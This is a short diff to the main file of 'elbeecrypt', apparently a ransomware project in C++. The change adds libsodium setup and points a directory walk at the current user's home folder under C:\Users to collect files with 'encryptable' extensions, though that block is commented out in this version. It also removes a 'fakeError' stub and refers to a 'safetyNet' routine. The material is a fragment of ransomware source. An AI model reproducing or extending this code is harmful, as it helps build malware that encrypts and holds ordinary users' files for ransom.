@@ -4,6 +4,8 @@
 #include <vector>
 #include "elbeecrypt/cryptor/main.hpp"
 
+#include <sodium.h>
+
 #include "elbeecrypt/common/io/direntwalk.hpp"
 #include "elbeecrypt/common/targets/extensions.hpp"
 
@@ -39,6 +41,9 @@ int main(int argc, char **argv){
 
 	cout << "Encryption routines started!" << endl;
 
+	std::cout << "Sodium: " << sodium_init() << std::endl;
+
+	/*
 	//Define the lambda to collect the directory listings
 	auto consumer = [](const fs::path& path){
 		if(elbeecrypt::common::targets::Extensions::isEncryptable(path)){
@@ -47,7 +52,9 @@ int main(int argc, char **argv){
 	};
 
 	//Call the walk function with the root path and the lambda
-	elbeecrypt::common::io::DirentWalk::walk(fs::path("C:\\Users\\"), consumer);
+	std::string uname(getenv("username"));
+	elbeecrypt::common::io::DirentWalk::walk(fs::path("C:\\Users\\" + uname), consumer);
+	*/
 
 	/*
 	vector<fs::path> paths = {};
@@ -62,11 +69,6 @@ int main(int argc, char **argv){
 		}
 	}
 	*/
-}
-
-/** Impl of fakeError(). */
-void cryptor::Main::fakeError(){
-
 }
 
 /** Impl of safetyNet(). */
